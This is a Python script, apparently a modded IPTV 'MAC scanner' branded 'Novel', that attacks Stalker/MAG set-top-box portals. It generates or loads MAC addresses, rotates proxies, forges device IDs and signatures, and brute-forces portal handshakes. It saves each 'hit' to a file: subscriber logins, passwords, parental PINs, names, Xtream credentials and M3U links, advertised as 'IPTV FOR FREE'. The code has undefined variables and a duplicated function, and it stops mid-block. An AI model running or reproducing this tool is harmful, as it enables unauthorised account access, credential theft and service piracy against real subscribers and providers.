import sys, os
import subprocess
import platform
import requests
import random, time, datetime
import logging
from urllib.parse import urlsplit
import urllib3
from urllib3.exceptions import InsecureRequestWarning
import colorama

urllib3.disable_warnings(InsecureRequestWarning)

useragent = "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"

try:
    import requests
except ImportError:
    print("requests module not found, installing...")
    subprocess.run([sys.executable, '-m', 'pip', 'install', 'requests'])
    import requests

try:
    import sock
except ImportError:
    print("sock module not found, installing...")
    subprocess.run([sys.executable, '-m', 'pip', 'install', 'PySocks'])
    import sock

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

my_os = platform.system()
my_cpu = platform.machine()  # Définition de la variable my_cpu
my_py = platform.python_implementation()  # Définition de la variable my_py

if my_os == "Windows":
    rootDir = "./"
    my_os = "Windows"
elif my_os == "Darwin":
    rootDir = os.path.join(os.path.expanduser('~'), 'Documents', 'Hits')
    my_os = "iOS"

dirs_to_create = ['Hits', 'combo', 'Proxy', 'sounds']
for dir_name in dirs_to_create:
    dir_path = os.path.join(rootDir, dir_name)
    if not os.path.exists(dir_path):
        os.makedirs(dir_path)

logging.captureWarnings(True)

Green = "\033[1;33m"
Blue = "  \33[1m\33[7;49;94m"
Grey = "\033[1;30m"
Reset = "\033[0m"
Red = "\033[1;31m"
Purple = "\033[0;35m"

def make_request(url):
    headers = {'User-Agent': useragent}
    try:
        response = requests.get(url, headers=headers, timeout=5, verify=False)
        if response.status_code == 200:
            print(f"Successfully accessed {url}")
        else:
            print(f"Failed to access {url} - Status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error accessing {url}: {e}")

make_request("https://www.example.com")

Novel =("""      
     \033[38;5;252m╔\033[38;5;252m──────────────────────────────     \33[0m╗ 
     \033[38;5;252m│\033[38;5;039m      _   _                        \033[38;5;252m│
     \033[38;5;252m│\033[38;5;039m     | \ | |   \033[38;5;039m__    __   _        \033[38;5;252m│
     \033[38;5;252m│\033[38;5;039m     |  \| | __\ \  / /__| |       \033[38;5;252m│
     \033[38;5;252m│\033[38;5;039m     |     |/ \033[38;5;039m_ \033[38;5;039m\ \/ / \033[38;5;039m_ \033[38;5;039m\ |       \033[38;5;252m│
     \033[38;5;252m│\033[38;5;251m     | |\  | (_) \033[38;5;251m\  /  \033[38;5;251m__\033[38;5;251m/ |___    \033[38;5;252m│
     \033[38;5;252m│\033[38;5;251m     |_| \_|\___/ \/ \___|_____|   \033[38;5;252m│
     \033[38;5;252m│\033[38;5;039m                                   \033[38;5;252m│
     \033[38;5;252m│\033[38;5;039m      🏛ⒼⓇⒺⒺⓀ🇬🇷    \033[38;5;003mⒶⓉⓉⒶⒸⓀ🔱          \033[38;5;252m│
     \033[38;5;252m│\33[90m         ᴘʏ ᴍᴏᴅᴅᴇᴅ ʙʏ ꜰᴀᴡᴋᴇꜱ       \033[38;5;252m│
     \033[38;5;252m╚\033[38;5;252m───────────────────────────────    \33[0m╝   """)

os.system('clear')
print(Novel)
info=("""\n\033[38;5;003m                  𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡          \33[0m\n
\033[38;5;039m                ꜱʏꜱᴛᴇᴍ \033[38;5;231m • \033[38;5;196m"""+my_os+"""  \33[0m         
\033[38;5;039m                ᴄᴘᴜ    \033[38;5;231m • \033[38;5;196m"""+str(my_cpu)+"""  \33[0m 
\033[38;5;039m                ꜱᴄᴀɴɴᴇʀ \033[38;5;231m• \033[38;5;196m"""+my_py+"""  \33[0m
\033[38;5;231m\n                 𝙳𝙰𝚃𝙴\033[38;5;231m      𝚃𝙸𝙼𝙴  \33[0m
\033[38;5;040m             """+str(time.strftime('%d\033[38;5;231m/\033[38;5;002m%m\033[38;5;231m/\033[38;5;002m%Y'))+"""\033[38;5;231m • \033[38;5;002m"""+str(time.strftime('%H\033[38;5;231m:\033[38;5;002m%M\033[38;5;231m:\033[38;5;002m%S'))+""" \33[0m\n
""")  
os.system('clear')
print(Novel)
print(info)
nickn=""
white=("""\033[36m\n""") 
if nickn=="":
	nickn=input("""\033[38;5;039m              𝗘𝗡𝗧𝗘𝗥 𝗬𝗢𝗨𝗥 𝗡𝗜𝗖𝗞𝗡𝗔𝗠𝗘    \33[0m     
            𝖨𝖿 𝗒𝗈𝗎 𝖽𝗈𝗇'𝗍 𝚠𝚛𝚒𝚝𝚎 𝖺𝗎𝗍𝗈𝗆𝖺𝗍𝗂𝖼                       \n\033[38;5;093m                      ꪀꪮꪜꫀꪶ     \33[0m\n\033[38;5;039m            ➣ \33[0m""")
if nickn == '':
    nickn = 'Novel' 
os.system('clear')                                  

cpm=0
cpmx=0
hitr=0
m3uon=0
m3uvpn=0
macon=0
macvpn=0


def echok(mac,bot,total,hitc,oran):
	global cpm,hitr,m3uon,m3uvpn,m3uonxmacon,macvpn,macvpn,macon,bib,tokenr
	bib=0
	cpmx=(time.time()-cpm)
	cpmx=(round(60/cpmx))
	if str(cpmx)=="0":
			cpm=cpm
	else:
			cpm=cpmx
	echo=("""
        \033[38;5;255m╔─────────────────────────╗       
          \033[38;5;255m𝙿ᴀɴᴇʟ\033[38;5;003m              \033[38;5;255mⓃⓄⓋⒺⓁ     \n          \033[38;5;196m"""+str(panel)+"""\33[0m 
          \033[38;5;255m𝚃ʏᴘᴇ\n          \033[38;5;002m"""+str(uzmanm)+"""\33[0m
          \033[38;5;039m𝙼ᴀᴄ\033[38;5;255m ➣ """+tokenr+str(mac)+"""        
          \033[38;5;196m"""+str(time.strftime('%d/%m/%Y'))+"""       \033[38;5;002m"""+str(time.strftime('%H:%M:%S'))+"""\33[0m 
          \033[38;5;003m𝙼ᴀᴄ 𝙲ʜᴇᴄᴋ         \033[38;5;003m𝙼3ᴜ 𝙲ʜᴇᴄᴋ  \33[0m
          \033[38;5;039m𝙾𝙽\033[38;5;255m|\033[38;5;002m"""+str(macon)+"""\033[38;5;255m|\033[38;5;039m𝚅𝙿𝙽\033[38;5;255m|\033[38;5;196m"""+str(macvpn)+"""\033[38;5;255m|     \033[38;5;039m𝙾𝙽\033[38;5;255m|\033[38;5;002m"""+str(m3uon)+"""\033[38;5;255m| \033[38;5;039m𝙾𝙵𝙵\033[38;5;255m|\033[38;5;196m"""+str(m3uvpn)+"""\033[38;5;255m|\33[0m
          \033[38;5;255m𝚃ᴏᴛᴀʟ\033[38;5;255m |\033[38;5;003m"""+str(total)+"""\033[38;5;255m|       \033[38;5;255m𝙲ᴘᴍ \033[38;5;255m|\033[38;5;196m"""+str(cpm)+"""\033[38;5;255m| \33[0m 
          \033[38;5;255m𝙱ᴏᴛ𝚜\033[38;5;255m  |\033[38;5;196m"""+str(bot)+"""\033[38;5;255m|       \033[38;5;255mRᴜɴ \033[38;5;255m|\033[38;5;039m"""+str(oran)+"""%\033[38;5;255m|
          \033[38;5;039m🏛ⒼⓇⒺⒺⓀ     \033[38;5;255m 🇬🇷 \033[38;5;003m ⒶⓉⓉⒶⒸⓀ⚔️     \33[0m\n
          \033[38;5;003mᡕᠵデ气亠💥 """+str(hitr)+ """ \033[38;5;255m| \033[38;5;002m""" +str(hitc)+""" \033[38;5;255m|\033[38;5;039m 🄷🄸🅃        \33[0m
        ╚─────────────────────────╝""")
	print(echo)
	cpm=time.time()
	
bot=0
hit=0
hitr="\33[1;92m"
tokenr="\33[0m"
oran=""
def bekle(bib,vr):
	i=bib
	
	animation = [
"\033[38;5;002m●○○○○○○○○○○○○○○","\033[38;5;002m●●○○○○○○○○○○○○○", "\033[38;5;002m●●●○○○○○○○○○○○○", "\033[38;5;002m●●●●○○○○○○○○○○○", "\033[38;5;002m●●●●●○○○○○○○○○○", "\033[38;5;002m●●●●●●○○○○○○○○○", "\033[38;5;002m●●●●●●●○○○○○○○○", "\033[38;5;002m●●●●●●●●○○○○○○○", "\033[38;5;002m●●●●●●●●●○○○○○○", "\033[38;5;002m●●●●●●●●●●○○○○○",
"\033[38;5;002m●●●●●●●●●●●○○○○",
"\033[38;5;002m●●●●●●●●●●●●○○○",
"\033[38;5;002m●●●●●●●●●●●●●○○",
"\033[38;5;002m●●●●●●●●●●●●●●○",
"\033[38;5;002m●●●●●●●●●●●●●●●\33[0m"]

	
	#for i in range(len(animation)):
	time.sleep(0.2)
	sys.stdout.write("\r"+'                ' + animation[ i % len(animation)])
	sys.stdout.flush()
	#print('\n')			

		
kanalkata="2"
stalker_portal="Novel"
def hityaz(mac,trh,real,m3ulink,m3uimage,durum,vpn,livelist,vodlist,serieslist,playerapi,fname,tariff_plan,ls,login,password,tariff_plan_id,bill,expire_billing_date,max_online,parent_password,stb_type,comment,country,settings_password,adult,scountry,country_name):
	global hitr,hitsay
	panell=panel
	reall=real
	if 'Novel' == 'Novel':#try:
		simza=""
		if uzmanm=="stalker_portal/server/load.php":
			panell=str(panel)+'/stalker_portal'
			reall=real.replace('/c/','/stalker_portal/c/')
			simza="""
╔═══════════════════╗
          ⚜️🅂🅃🄰🄻🄺🄴🅁🇬🇷🄸🄽🄵🄾⚜️
    𝐁𝐈𝐋𝐋𝐈𝐍𝐆 𝐃𝐀𝐓𝐄➛ """+str(bill)+"""
    𝐄𝐗𝐏𝐈𝐑𝐄 𝐃𝐀𝐓𝐄➛ """+expire_billing_date+"""
    𝐋𝐎𝐆𝐈𝐍➛ """+login+"""
    𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃➛ """+password+"""
    𝐅𝐔𝐋𝐋 𝐍𝐀𝐌𝐄➛ """+fname+"""
    𝐀𝐃𝐔𝐋𝐓 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃➛ """+parent_password+"""
    𝐋𝐒➛ """+ls+"""
    𝐓𝐀𝐑𝐈𝐅𝐅 𝐈𝐃➛ """+tariff_plan_id+"""
    𝐓𝐀𝐑𝐈𝐅𝐅 𝐏𝐋𝐀𝐍➛ """+tariff_plan+"""
    𝐌𝐀𝐗 𝐎𝐍𝐋𝐈𝐍𝐄➛ """+max_online+"""
    𝐒𝐓𝐁 𝐓𝐘𝐏𝐄➛ """+stb_type+"""
    𝐂𝐎𝐔𝐍𝐓𝐑𝐘➛ """+country+"""
    𝐒𝐄𝐓𝐓𝐈𝐍𝐆 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃➛ """+settings_password+"""
    𝐂𝐎𝐌𝐌𝐄𝐍𝐓➛ """+comment+""" 
╚═══════════════════╝"""
		imza="""
        🏛 ⒼⓇⒺⒺⓀ 🔱ⒶⓉⓉⒶⒸⓀ 🏛
         ⚜️🅂🅈🅂🅃🄴🄼 🇬🇷 🄸🄽🄵🄾⚜️
╔═══════════════════╗
    𝐒𝐘𝐒𝐓𝐄𝐌 ➛ """+my_os+"""              
    𝐂𝐏𝐔 ➛ """+str(my_cpu)+"""   
    𝐒𝐂𝐀𝐍𝐍𝐄𝐑 ➛ """+my_py+"""      
    𝐒𝐂𝐀𝐍𝐁𝐘 ➛ """+str(nickn)+"""
    𝐃𝐀𝐓𝐄 ➛ """+str(time.strftime('%a %d %b %Y'))+"""
    𝐓𝐈𝐌𝐄 ➛ """+str(time.strftime('%H:%M'))+"""
    𝐌𝐎𝐃𝐁𝐘 ➛  ⓃⓄⓋⒺⓁ
╚═══════════════════╝
         ⚜️🄿🄾🅁🅃🄰🄻 🇬🇷 🄸🄽🄵🄾⚜️ 
╔═══════════════════╗
     𝐑𝐄𝐀𝐋
     """+str(reall)+"""
     𝐏𝐎𝐑𝐓𝐀𝐋   
     http://"""+str(panell)+"""/c/
     𝐏𝐎𝐑𝐓𝐀𝐋𝐓𝐘𝐏𝐄
 	"""+str(uzmanm)+"""
     𝐌𝐀𝐂 
     """+str(mac)+"""
     𝐄𝐍𝐃𝐒 
     """+str(trh)+"""
     𝐀𝐃𝐔𝐋𝐓𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃
     """+str(adult)+"""
     𝐇𝐈𝐓𝐒𝐁𝐘
     | """+str(KRAKEN)+""" |
╚═══════════════════╝
        ⚜️🄲🄷🄰🄽🄽🄴🄻 🇬🇷 🄲🄷🄴🄲🄺⚜️
╔═══════════════════╗
     𝐌𝐀𝐂 ➛ """+str(durum)+"""
     𝐌3𝐔 ➛ """+m3uimage+"""
     𝐕𝐏𝐍 ➛ """+str(vpn)+"""
     𝐂𝐎𝐔𝐍𝐓𝐑𝐘 ➛ """+str(country_name)+""" """+data_server(str(scountry))+""" """+str(playerapi)+""" 
╚═══════════════════╝"""
		sifre=device(mac)
		
		pimza="""
                  ⚜️🄼3🅄 🇬🇷 🄻🄸🄽🄺⚜️
╔═══════════════════╗
   𝐌3𝐔
   """+str(m3ulink)+""" """
		imza=imza+sifre+simza+pimza
		if  kanalkata=="1" or kanalkata=="2":
			imza=imza+""" 
╚═══════════════════╝
              ⚜️🄼🄴🄳🄸🄰 🇬🇷 🄻🄸🅂🅃⚜️
╔═══════════════════╗
   🅲🅷🅰︎🅽🅽🅴🅻🆂
   """+str(livelist)+""" """
		if kanalkata=="2":
			imza=imza+"""  
   🆅🅾🅳
   """+str(vodlist)+""" 
   🆂🅴🆁🅸🅴🆂
   """+str(serieslist)+"""
╚═══════════════════╝
"""
		#imza=imza
		yax(imza)
		hitsay=hitsay+1
		print(imza)
		if hitsay >= hit:
			hitr="\33[1;92m"
	#except:pass

def data_server(scountry):
    
    bandera=''
    pais=''
    origen=''
    try:        
        codpais=scountry
        bandera=flag.flag(codpais)
        origen=bandera
    except:pass
    return origen

import os
#dosyaadi=str(input("""
#Type the name of the new hit file!

#File name = """))

hits=rootDir+'/Hits/KRAKEN/'
if not os.path.exists(hits):
    os.mkdir(hits)

def yax(hits):
    dosya=open(Dosyab,'a+', encoding='utf-8') 
    dosya.write(hits)
    dosya.close()	
def device(mac):
	mac=mac.upper()
	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
	SNENC=SN.upper() #SN
	SNCUT=SNENC[:13]#Sncut
	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
	DEVENC=DEV.upper() #dev1
	DEV1=hashlib.sha256(SNCUT.encode('utf-8')).hexdigest()
	DEVENC1=DEV1.upper()#dev2
	SG=SNCUT+'+'+(mac)
	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
	SINGENC=SING.upper()
	sifre="""
                  ⚜️🄴🄽🄲🇬🇷🄸🄽🄵🄾⚜️
╔═══════════════════╗
  𝐒𝐄𝐑𝐈𝐀𝐋 
  """+SN+"""   
  𝐒𝐄𝐑𝐈𝐀𝐋𝐂𝐔𝐓
  """+SNCUT+"""
  𝐃𝐄𝐕𝐈𝐂𝐄 𝐈𝐃¹
  """+DEVENC+"""
  𝐃𝐄𝐕𝐈𝐂𝐄 𝐈𝐃²
  """+SINGENC+"""
  𝐒𝐈𝐆𝐍𝐀𝐓𝐔𝐑𝐄 
  """+DEVENC1+"""
╚═══════════════════╝ """

	return sifre
def list(listlink,mac,token,livel):
	kategori=""
	veri=""
	while True:
		try:
			res = ses.get(listlink,headers=hea2(mac,token),proxies=proxygetir(),timeout=(3), verify=False)
			veri=str(res.text)
			break
		except:pass
	if veri.count('title":"')>0:
			for i in veri.split('title":"'):
				try:
					kanal=""
					kanal= str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
				except:pass
				kategori=kategori+kanal+livel
				kategori=kategori.replace("{","")
	list=kategori
	return list
def m3ugoruntu(cid,user,pas,plink):
	durum="𝗢𝗙𝗙𝗟𝗜𝗡𝗘 ⛔"
	try:
			url=http+"://"+plink+'/live/'+str(user)+'/'+str(pas)+'/'+str(cid)+'.ts'
			res = ses.get(url,  headers=hea3(), timeout=(2,5), allow_redirects=False,stream=True)
			if res.status_code==302:
				durum="𝗢𝗡𝗟𝗜𝗡𝗘 ✅"
	except:
			durum="𝗢𝗙𝗙𝗟𝗜𝗡𝗘 ⛔"
	return durum
hit=0						

def m3uapi(playerlink,mac,token):
	mt=""
	bag=0
	veri=""
	bad=0
	while True:
		try:
			res = ses.get(playerlink, headers=hea2(mac,token), proxies=proxygetir(),timeout=(3), verify=False)
			veri=str(res.text)
			break
		except:
			if not proxi =="1":
				bad=bad+1
				if bad==3:
					break
	if veri=="" or '404' in veri:
		bad=0
		while True:
			try:
				playerlink=playerlink.replace('player_api.php','panel_api.php')
				res = ses.get(playerlink, headers=hea2(mac,token), proxies=proxygetir(),timeout=(3), verify=False)
				veri=str(res.text)
				break
			except:
				if not proxi =="1":
					bad=bad+1
					if bad==3:
						break
	acon=""
	timezone=""
	message=""
	if 'active_cons' in veri:
				acon=veri.split('active_cons":')[1]
				acon=acon.split(',')[0]
				acon=acon.replace('"',"")
				mcon=veri.split('max_connections":')[1]
				mcon=mcon.split(',')[0]
				mcon=mcon.replace('"',"")
				status=veri.split('status":')[1]
				status=status.split(',')[0]
				status=status.replace('"',"")
				try:
					timezone=veri.split('timezone":"')[1]
					timezone=timezone.split('",')[0]
					timezone=timezone.replace("\/","/")
				except:pass
				realm=veri.split('url":')[1]
				realm=realm.split(',')[0]
				realm=realm.replace('"',"")
				port=veri.split('port":')[1]
				port=port.split(',')[0]
				port=port.replace('"',"")
				userm=veri.split('username":')[1]
				userm=userm.split(',')[0]
				userm=userm.replace('"',"")
				pasm=veri.split('password":')[1]
				pasm=pasm.split(',')[0]
				pasm=pasm.replace('"',"")
				bitism=veri.split('exp_date":')[1]
				bitism=bitism.split(',')[0]
				bitism=bitism.replace('"',"")
				try:
					message=veri.split('message":"')[1].split(',')[0].replace('"','')
					message=str(message.encode('utf-8').decode("unicode-escape")).replace('\/','/')
					if message=="":
								message="👺Novel! IPTV FOR FREE!"
				except:pass
				if bitism=="null":
					bitism="𝐔𝐍𝐋𝐈𝐌𝐈𝐓𝐄𝐃"
				else:
					bitism=(datetime.datetime.fromtimestamp(int(bitism)).strftime('%d-%m-%Y %H:%M:%S'))
					mt=("""
╔═══════════════════╗
              🅇🅃🅁🄴🄰🄼🇬🇷🄸🄽🄵🄾				
   𝐌𝐄𝐒𝐒𝐀𝐆𝐄➛ """+str(message)+""" 
   𝐇𝐎𝐒𝐓➛ http://"""+panel+"""/c/
   𝐑𝐄𝐀𝐋➛ http://"""+realm+""":"""+port+"""/c/
   𝐏𝐎𝐑𝐓➛ """+port+"""
   𝐇𝐈𝐓𝐒𝐁𝐘➛ """+str(nickn)+"""
   𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄➛ """+userm+"""
   𝐏𝐀??𝐒𝐖𝐎𝐑𝐃➛ """+pasm+"""
   𝐄𝐗𝐏𝐈𝐑𝐀𝐓𝐈𝐎𝐍➛ """+bitism+""" 
   𝐀𝐂𝐓??𝐕𝐄 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐈𝐎𝐍 ➛ """+acon+"""
   𝐌𝐀𝐗𝐈𝐌𝐔𝐌 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐈𝐎𝐍 ➛ """+mcon+""" 
   𝐒𝐓𝐀𝐓𝐔𝐒➛ """+status+"""
   𝐓𝐈𝐌𝐄𝐙𝐎𝐍𝐄➛ """+timezone+"""
╚═══════════════════╝""")
	return mt
	
							
def goruntu(link,cid):
	#print(link)
	say=0
	duru="𝗘𝗫𝗜𝗦𝗧 ✅ "
	try:
		res = ses.get(link,  headers=hea3(), timeout=10, allow_redirects=False,stream=True)
		#print(res.status_code)
		if res.status_code==302:
			duru="𝗘𝗫𝗜𝗦𝗧 ✅ "
	except:
			duru="𝗨𝗦𝗘 𝗩𝗣𝗡 ⛔"
	return duru		
		
def url7(cid):
	url=http+"://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/"+str(cid)+"_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
	if uzmanm=="stalker_portal/server/load.php":
		url7=http+"://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffrt%20http://localhost/ch/"+str(cid)+"&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
		url7=http+"://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffrt%20http:///ch/"+str(cid)+"&&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
	return str(url)
	
def hea3():
	hea={
"Icy-MetaData": "1",
"User-Agent": "Lavf/57.83.100", 
"Accept-Encoding": "identity",
"Host": panel,
"Accept": "*/*",
"Range": "bytes=0-",
"Connection": "close",
	}
	return hea		
	import pathlib

def hitecho(mac, trh):
    sound = "/sdcard/sounds/Sek.mp3"
    file = pathlib.Path(sound)
    try:
        if file.exists():
            ad.mediaPlay(sound)
    except:
        pass	
def hitecho(mac,trh):
	sound="/sdcard/sounds/Sek.mp3"
	file = pathlib.Path(sound)
	try:
		  if file.exists ():
		     ad.mediaPlay(sound)
	except:pass

def unicode(fyz):
	cod=fyz.encode('utf-8').decode("unicode-escape").replace('\/','/')
	return cod

def duzel2(veri,vr):
	data=""
	try:
		data=veri.split('"'+str(vr)+'":"')[1]
		data=data.split('"')[0]
		data=data.replace('"','')
		data=unicode(data)
	except:pass
	return str(data)
				
def duzelt1(veri,vr):
	data=veri.split(str(vr)+'":"')[1]
	data=data.split('"')[0]
	data=data.replace('"','')
	return str(data)
				
									
import datetime
import time
import hashlib
import urllib
def url2(mac,random):
	macs=mac.upper()
	macs=urllib.parse.quote(macs)
	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
	SNENC=SN.upper() #SN
	SNCUT=SNENC[:13]#Sncut
	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
	DEVENC=DEV.upper() #dev1
	DEV1=hashlib.sha256(SNCUT.encode('utf-8')).hexdigest()
	DEVENC1=DEV1.upper()#dev2
	SG=SNCUT+(mac)
	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
	SINGENC=SING.upper() #signature
	times=time.time()
	url22=http+"://"+panel+"/"+uzmanm+"?action=get_profile&type=stb&&sn=""&device_id=""&device_id2=&timestamp="+str(times)+""
	if uzmanm=="stalker_portal/server/load.php":
	    times=time.time()
	    url22=http+"://"+panel+"/"+uzmanm+'?type=stb&action=get_profile&hd=1&ver=ImageDescription:%200.2.18-r22-pub-270;%20ImageDate:%20Tue%20Dec%2019%2011:33:53%20EET%202017;%20PORTAL%20version:%205.6.6;%20API%20Version:%20JS%20API%20version:%20328;%20STB%20API%20version:%20134;%20Player%20Engine%20version:%200x566&num_banks=2&sn='+SNCUT+'&stb_type=MAG270&client_type=STB&image_version=0.2.18&video_out=hdmi&device_id='+DEVENC+'&device_id2='+DEVENC+'&signature=OaRqL9kBdR5qnMXL+h6b+i8yeRs9/xWXeKPXpI48VVE=&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&metrics=%7B%22mac%22%3A%22'+macs+'%22%2C%22sn%22%3A%22'+SNCUT+'%22%2C%22model%22%3A%22MAG270%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22BB340DE42B8A3032F84F5CAF137AEBA287CE8D51F44E39527B14B6FC0B81171E%22%2C%22random%22%3A%22'+random+'%22%7D&hw_version_2=85a284d980bbfb74dca9bc370a6ad160e968d350&timestamp='+str(times)+'&api_signature=262&prehash=efd15c16dc497e0839ff5accfdc6ed99c32c4e2a&JsHttpRequest=1-xml'
	    if stalker_portal=="2":
	    	url22=http+"://"+panel+"/"+uzmanm+'?type=stb&action=get_profile&hd=1&ver=ImageDescription: 0.2.18-r14-pub-250; ImageDate: Fri Jan 15 15:20:44 EET 2016; PORTAL version: 5.5.0; API Version: JS API version: 328; STB API version: 134; Player Engine version: 0x566&num_banks=2&sn='+SNCUT+'&stb_type=MAG254&image_version=218&video_out=hdmi&device_id='+DEVENC+'&device_id2='+DEVENC+'&signature='+SINGENC+'&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&client_type=STB&hw_version_2=7c431b0aec69b2f0194c0680c32fe4e3&timestamp='+str(times)+'&api_signature=263&metrics={\\\"mac\\\":\\\"'+macs+'\\\",\\\"sn\\\":\\\"'+SNCUT+'\\\",\\\"model\\\":\\\"MAG254\\\",\\\"type\\\":\\\"STB\\\",\\\"uid\\\":\\\"'+DEVENC+'\\\",\\\"random\\\":\\\"'+random+'\\\"}&JsHttpRequest=1-xml'
	    if stalker_portal=="1":
	    	url22=http+"://"+panel+"/"+uzmanm+'?action=get_profile&mac="+macs+"&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22"+macs+"%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22null%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566'
	    	
	    	
	if realblue=="real" or uzmanm=="c/portal.php":
		url22=http+"://"+panel+"/"+uzmanm+"?&action=get_profile&mac="+macs+"&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22"+macs+"%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22null%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566"
	return url22
def XD():
	global m3uvpn,m3uon,macon,macvpn,bot,hit,tokenr,hitr
	bot=bot+1
	for Novel in range(combouz):
		if comboc=="Novel":
			mac=randommac()
			mac=mac.upper()
		else:
			macv=re.search(pattern,combogetir(),re.IGNORECASE)
			if macv:
				mac=macv.group()
				mac=mac.upper()
			else:
				continue
		url=http+"://"+panel+"/"+uzmanm+"?type=stb&action=handshake&token=&prehash=false&JsHttpRequest=1-xml"
		ses=requests.Session()
		prox=proxygetir()
		oran=round(((combosay)/(combouz)*100),2)
		echok(mac,bot,combosay,hit,oran)
		#print(url)
		while True:
			try:
				res=ses.get(url,headers=hea1(panel,mac),proxies=prox,timeout=(3))
				break
			except:
				prox=proxygetir()
		veri=str(res.text)
    #print(veri)
		random=""
		if not 'token":"' in veri:
			tokenr="\33[35m"
			ses.close
			res.close
			continue
		tokenr="\33[0m"
		token=duzelt1(veri,"token")
		if 'random' in veri:
			random=duzelt1(veri,"random")
		veri=""
		while True:
			try:
				res=ses.get(url2(mac,random),headers=hea2(mac,token),proxies=prox,timeout=(3))
				break
			except:
				prox=proxygetir()
		veri=str(res.text)
		#adult=veri.split('parent_password":"')[1]
		#adult=adult.split('","bright')[0]
		#print(veri)
		adult="0000"
		id="null"
		ip=""
		login=""
		parent_password="0000"
		password=""
		stb_type=""
		tariff_plan_id=""
		comment=""
		country="Unavailable"
		settings_password=""
		expire_billing_date=""
		max_online="Unavailable"
		expires=""
		ls="Unavailable"
		try:
			id=veri.split('{"js":{"id":')[1]
			id=str(id.split(',"name')[0])
		except:pass
		
		try:
				ip=str(duzel2(veri,"ip"))
		except:pass
		try:
			expires=str(duzel2(veri,"expires"))
		except:pass
		if id=="null" and expires=="" and ban=="":
			continue
			ses.close
			res.close
		if uzmanm=="stalker_portal/server/load.php":
			if 'login":"' in veri:
				login=str(duzel2(veri,"login"))
				parent_password=str(duzel2(veri,"parent_password"))
				if not parent_password=="":
					adult = parent_password
				password=str(duzel2(veri,"password"))
				stb_type=str(duzel2(veri,"stb_type"))
				tariff_plan_id=str(duzel2(veri,"tariff_plan_id"))
				comment=str(duzel2(veri,"comment"))
				if comment=="":
					comment="👺Novel! IPTV FOR FREE!"
				country=str(duzel2(veri,"country"))
				settings_password=str(duzel2(veri,"settings_password"))
				expire_billing_date=str(duzel2(veri,"expire_billing_date"))
				ls=str(duzel2(veri,"ls"))
				try:
					max_online=str(duzel2(veri,"max_online"))
				except:pass
		#print(veri)
		url=http+"://"+panel+"/"+uzmanm+"?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
		
		veri=""
		while True:
			try:
				res=ses.get(url,headers=hea2(mac,token),proxies=prox,timeout=(3))
				break
			except:
				prox=proxygetir()
		veri=str(res.text)
		#print(veri)
	#	quit()
		if veri.count('phone')==0 and veri.count('end_date')==0 and expires=="" and expire_billing_date=="":
			continue
			ses.close
			res.close
		fname=""
		tariff_plan=""
		ls="Unavailable"
		trh=""
		bill="Unavailable"
		if uzmanm=="stalker_portal/server/load.php":
			try:
				fname=str(duzel2(veri,"fname"))
			except:pass
			try:
			    tariff_plan=str(duzel2(veri,"tariff_plan"))
			except:pass
			try:
			    bill=str(duzel2(veri,"created"))
			except:pass
		if "phone" in veri:
			trh=str(duzel2(veri,"phone"))
		if "end_date" in veri:
			trh=str(duzel2(veri,"end_date"))
		if trh=="":
			if not expires=="":
				trh=expires
		try:
			trh=(datetime.datetime.fromtimestamp(int(trh)).strftime('%d-%m-%Y %H:%M:%S'))
		except:pass
		if '(-' in trh:
			continue
			ses.close
			res.close
		
		if trh.lower()[:2] =='un':
			KalanGun=(" Days")
		else:
			try:
